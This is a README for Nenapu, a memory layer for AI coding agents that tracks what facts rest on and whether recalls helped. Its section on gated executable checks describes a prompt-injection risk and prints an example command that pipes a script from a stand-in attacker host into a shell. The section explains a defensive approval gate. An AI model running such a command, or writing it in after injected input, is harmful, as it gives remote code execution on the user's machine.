<div align="center">

```
 ███╗   ██╗███████╗███╗   ██╗ █████╗ ██████╗ ██╗   ██╗
 ████╗  ██║██╔════╝████╗  ██║██╔══██╗██╔══██╗██║   ██║
 ██╔██╗ ██║█████╗  ██╔██╗ ██║███████║██████╔╝██║   ██║
 ██║╚██╗██║██╔══╝  ██║╚██╗██║██╔══██║██╔═══╝ ██║   ██║
 ██║ ╚████║███████╗██║ ╚████║██║  ██║██║     ╚██████╔╝
 ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝      ╚═════╝
```

**ನೆನಪು** — *memory, in Kannada*

Memory for AI agents that knows **what it rests on** and **whether it helped**.

</div>

---

## The problem

Every agent memory system — Mem0, Zep, Supermemory, Letta — is
**write-and-retrieve**. They compete on retrieval relevance: did the right text
come back. Two things follow, and nothing addresses either.

**A memory does not know what it rests on.**

```
        day 1                              day 90
  ┌──────────────────────┐          ┌──────────────────────┐
  │ auth lives in        │          │ auth lives in        │  ← repo moved,
  │ services/auth        │  0.90    │ services/auth        │     now false
  └──────────┬───────────┘          └──────────┬───────────┘
             │ agent concludes                 │
             ▼                                 ▼
  ┌──────────────────────┐          ┌──────────────────────┐
  │ new endpoints go in  │  0.90    │ new endpoints go in  │  0.90  ← still
  │ services/auth/routes │          │ services/auth/routes │        confident,
  └──────────────────────┘          └──────────────────────┘        still wrong
```

**A memory does not know whether it helped.** A fact can match a query
perfectly and still send the task the wrong way — and be recalled tomorrow with
the same confidence. Systems grade *retrieval*. None grade *consequences*.

## What Nenapu does instead

```
  $ nenapu verify
  fail   #1   test -d services/auth  →  exit 1

  $ nenapu loops
   id   state     fact                             why
   4    suspect   new endpoints go in .../routes   rests on #1: check failed
   1    active    auth code lives in services/auth exit 1

  $ nenapu why 4
  belief 0.31   (was 0.90)
  suspect: rests on #1: check failed
    #4 new endpoints go in services/auth/routes.py
    ✗ #1 auth code lives in services/auth  (inferred)
```

A `mv` falsified one fact. A **different** fact — never checked, never
mentioned — lost standing because its foundation collapsed.

**Nobody declared that dependency.** It was inferred from the agent recalling #1
and then writing #4 in the same session.

## How it works

```
   ┌─────────────────────────────────────────────────────────────┐
   │  WRITE                                                      │
   │    ├─ provenance          user_stated > agent_inferred      │
   │    ├─ decay class         volatile 14d … immutable never    │
   │    ├─ contradiction       same key + different value = clash│
   │    └─ edges inferred      recalled A, wrote B → B rests on A│
   ├─────────────────────────────────────────────────────────────┤
   │  RECALL                                                     │
   │    ├─ ranked by match AND current believability             │
   │    └─ logged with a recall_id, to be graded later           │
   ├─────────────────────────────────────────────────────────────┤
   │  FALSIFY                        (check fails / superseded)  │
   │    ├─ belief collapses 10×                                  │
   │    ├─ cascade → every dependent becomes `suspect`           │
   │    └─ recent recalls of it are marked bad, automatically    │
   └─────────────────────────────────────────────────────────────┘
```

**Confidence is six signals, not a number you set:**

```
belief = asserted × origin × decay(age) × check × track-record × support
```

**Recalls are graded four ways** — two need no cooperation from anything:

| signal | source | needs |
|---|---|---|
| `verification` | a recalled fact's check later fails | nothing |
| `correction` | a recalled fact is contradicted soon after | nothing |
| `agent` | harness reports task success | one MCP call |
| `human` | `nenapu bad <recall_id>` | you, annoyed |

**Nothing is destroyed.** Superseded, archived, suspect and retired facts stay,
with pointers to what replaced them and a journal of every action.

## Install

```bash
uv tool install git+https://github.com/Pratheekb11/Nenapu    # or pipx, same URL
uv tool install --editable .                               # from a clone
nenapu                                                     # first run: sets it up
```

The first bare `nenapu` walks you through setup and then shows a how-to guide.
It does that once — after that a bare `nenapu` is just the command list, and
`nenapu guide` brings the walkthrough back.

Store lives at `~/.nenapu/nenapu.db`. One SQLite file — copy it, diff it, back
it up.

## It is a layer, not a tool call

This is the part that matters, and it is where every other memory system
stops. Memory an agent has to *ask* for is memory it will forget to ask for —
and the agent that just got corrected is exactly the one least likely to stop
and file a note about it.

So Nenapu does not wait to be called. Two Claude Code hooks do the work:

```
   SessionStart  ──▶  nenapu recall-hook
                        what you have learned is put into the session's
                        context before the agent does anything

   ( you work. you correct it. )

   Stop          ──▶  nenapu observe --stdin --detach
                        the finished transcript is read in the background,
                        corrections and decisions extracted and stored
```

The agent never decides to remember. Next session it simply already knows.

```
  Previously corrected — do not repeat these:
  - The user wants commits made without a Co-Authored-By trailer.
  - The user prefers to only commit the specific files they name.

  Do not rely on these — what they rested on was falsified:
  - New endpoints go in services/auth/routes.py
```

`--detach` is not a flourish. Extraction is a model call over a whole session
— 83 seconds against real transcripts here. A Stop hook that blocks for 83
seconds is unusable, and one capped at 60 is killed before it writes anything,
which is how a memory layer ends up looking like it works while learning
nothing.

## Use

```bash
nenapu write "The API listens on port 8080" --kind environment --key api.port \
  --verify-cmd "curl -sf localhost:8080/health"

nenapu write "The API listens on port 9090" --kind environment --key api.port
# conflict with #1: same key, conflicting values → superseded
#   ...and everything derived from #1 is now suspect

nenapu search "what port"    # ranked by match AND believability
nenapu why 7                 # what #7 rests on, and what rests on #7
nenapu loops                 # what the store no longer stands behind
nenapu verify                # re-run checks; failures cascade
nenapu export ./CLAUDE.md    # materialize into a managed block
```

Run `nenapu` alone for the full command list, grouped into five panels.

## Editors without a hook API

Cursor, VS Code and Codex have no hook API, so there the memory has to be
reachable as tools. `nenapu init` registers the MCP server for them and prints
a rules block (`nenapu rules`) telling the agent to use it.

```bash
claude mcp add nenapu -- nenapu-mcp     # also available on Claude Code
```

Ten tools: `memory_search`, `memory_write`, `memory_why`, `memory_verify`,
`memory_loops`, `task_outcome`, `memory_forget`, and the skill trio.
`NENAPU_TOOLS=minimal|memory|full` trades surface for tokens.

This is the weaker mode, and honestly so: it only fires when the agent decides
to fire it. Hooks are the reason Nenapu works when nobody is cooperating.

## Executable checks are gated

`verify_cmd` is shell, and facts are written by agents that read untrusted
input. Without a gate, one prompt-injected write turns `nenapu verify` into
scheduled remote code execution.

```
$ nenapu approve
#3 Build cache lives in /tmp/cache
  origin  : agent_inferred  (written by an agent, not by you)
  command : curl -s https://evil.example/x.sh | sh
  !! pipes into a shell
  !! fetches from the network
  approve this command to run on every verify? [y/N]
```

Approval binds to the exact command string. Nothing over MCP or HTTP can
approve anything. Non-interactive shells refuse rather than defaulting to yes.

## Model backends

Only two scheduled jobs call a model. Neither needs a cloud account.

| `NENAPU_LLM` | what |
|---|---|
| `auto` (default) | Anthropic if credentials exist, else an agent CLI on PATH, else a local server |
| `ollama` / `lmstudio` / `openai` | local, stdlib HTTP, no extra dependency |
| `exec` | any CLI on stdin, e.g. `claude -p` — no second credential |
| `anthropic` | Claude API |

**Calibrate before trusting one.** Accuracy alone cannot tell a careful auditor
from one that answers `stale` unconditionally. `nenapu doctor --calibrate` runs
the same facts past refuting, confirming and irrelevant evidence and checks
whether the verdicts *change with the evidence*:

| model | contradicting | confirming | absent | |
|---|---|---|---|---|
| qwen2.5:0.5b | 2/4 | 0/4 | 0/4 | `stale` regardless of input |
| qwen2.5:1.5b | 2/4 | 2/4 | 0/4 | invents ids |
| qwen2.5:3b | 75% | **25%** | 100% | treats *mention* as contradiction |
| frontier via `exec` | 75% | 75% | 100% | **passes** |

A backend that fails is refused. Local backends are report-only unless you pass
`--apply`.

The ordering in `auto` is why `exec` sits above the local servers, and it was
settled by measurement rather than by cost. Extraction sends about 6,000 tokens
of conversation and asks for structured JSON back. Through `claude -p` that
takes 83s; through the default local 3B on a CPU-only host it did not finish at
all — 180s, twice. A backend that always times out is not the cheaper answer,
it is no answer: the session ends and the store stays empty. The calibration
table above says the same thing about quality.

An agent CLI is itself a harness, so it fires its own `Stop` hook when it
finishes — which is the hook that started the extraction. The extraction runs
with `NENAPU_OBSERVING=1` and the hook stands down when it sees it, so the
chain is one level deep rather than unbounded.

## Performance

At 3,000 facts: write **2.2 ms**, recall **87 ms**, cascade over 900 dependents
**102 ms**, dedupe **3.2 s**. The core loop never calls a model.

## Themes

```bash
nenapu theme              # preview all five, marked with the active one
nenapu theme violet       # switch, remembered in ~/.nenapu/config.json
```

`teal` · `violet` · `indigo` · `jade` · `mono`. `NENAPU_THEME` overrides for a
single run without changing the saved choice; `NENAPU_NO_BANNER=1` silences the
banner for cron and CI.

---

Implementation decisions, measurements and the failures behind them:
**[IMPLEMENTATION_NOTES.md](IMPLEMENTATION_NOTES.md)**

MIT
